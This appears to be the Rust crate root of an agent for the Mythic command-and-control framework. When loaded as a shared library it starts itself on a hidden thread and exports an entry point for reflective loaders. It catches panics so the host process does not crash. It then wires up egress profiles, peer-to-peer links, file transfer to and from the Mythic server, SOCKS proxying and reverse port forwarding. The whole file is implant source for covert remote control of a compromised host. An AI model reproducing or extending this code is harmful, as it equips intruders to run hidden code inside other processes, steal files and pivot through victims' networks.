#![allow(dead_code)]

pub mod commands;
pub mod profiles;
pub mod responses;
pub mod structs;
pub mod tasks;
pub mod utils;

/// Auto-start when loaded as a shared library.
/// Uses raw pthread_create instead of std::thread::spawn because Rust's
/// standard library may not be fully initialized during __mod_init_func.
#[ctor::ctor]
fn _auto_start() {
    eprintln!("[agent] _auto_start() ctor fired");
    unsafe {
        let mut attr: libc::pthread_attr_t = std::mem::zeroed();
        libc::pthread_attr_init(&mut attr);
        // Default pthread stack on macOS is 512KB — too small for Rust/tokio.
        // Set to 8MB to match Rust's default thread stack size.
        libc::pthread_attr_setstacksize(&mut attr, 8 * 1024 * 1024);

        let mut thread: libc::pthread_t = std::mem::zeroed();
        libc::pthread_create(
            &mut thread,
            &attr,
            _thread_entry,
            std::ptr::null_mut(),
        );
        libc::pthread_attr_destroy(&mut attr);
        libc::pthread_detach(thread);
    }
}

extern "C" fn _thread_entry(_: *mut libc::c_void) -> *mut libc::c_void {
    eprintln!("[agent] _thread_entry() started");
    // Catch any panics so the host process doesn't abort
    let result = std::panic::catch_unwind(|| {
        eprintln!("[agent] calling run_main()");
        run_main();
    });
    if let Err(e) = result {
        let msg = if let Some(s) = e.downcast_ref::<&str>() {
            s.to_string()
        } else if let Some(s) = e.downcast_ref::<String>() {
            s.clone()
        } else {
            "unknown panic".to_string()
        };
        eprintln!("[agent] PANIC in run_main: {}", msg);
    }
    std::ptr::null_mut()
}

/// Entry point for shared library mode.
/// Reflective loaders and dlopen callers can also invoke this symbol directly.
/// Blocks the calling thread.
#[no_mangle]
pub extern "C" fn run_main() {
    eprintln!("[agent] run_main() entered");
    let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
    eprintln!("[agent] tokio runtime created");
    rt.block_on(async {
        // 1. Initialize egress and bind profiles
        eprintln!("[agent] calling profiles::initialize()");
        profiles::initialize();

        eprintln!("[agent] profiles::initialize() done");

        // 2. Initialize responses
        let response_channels = responses::initialize(profiles::get_push_channel);

        // 3. Initialize P2P system
        let p2p_channels = utils::p2p::initialize(
            response_channels.p2p_connection_message_tx.clone(),
            profiles::get_mythic_id,
        );

        // 4. Initialize file transfer system
        let (send_file_tx, get_file_tx) = utils::files::initialize();

        // 5. Initialize task system
        tasks::initialize(tasks::TaskChannels {
            new_response_tx: response_channels.new_response_tx.clone(),
            send_file_to_mythic_tx: send_file_tx,
            get_file_from_mythic_tx: get_file_tx,
            add_internal_connection_tx: p2p_channels.add_connection_tx,
            remove_internal_connection_tx: p2p_channels.remove_connection_tx,
            interactive_task_output_tx: response_channels.new_interactive_task_output_tx.clone(),
            new_alert_tx: response_channels.new_alert_tx.clone(),
            from_mythic_socks_tx: response_channels.from_mythic_socks_tx.clone(),
            from_mythic_rpfwd_tx: response_channels.from_mythic_rpfwd_tx.clone(),
        });

        // 6. Start running egress profiles
        eprintln!("[agent] calling profiles::start()");
        profiles::start().await;
    });
}
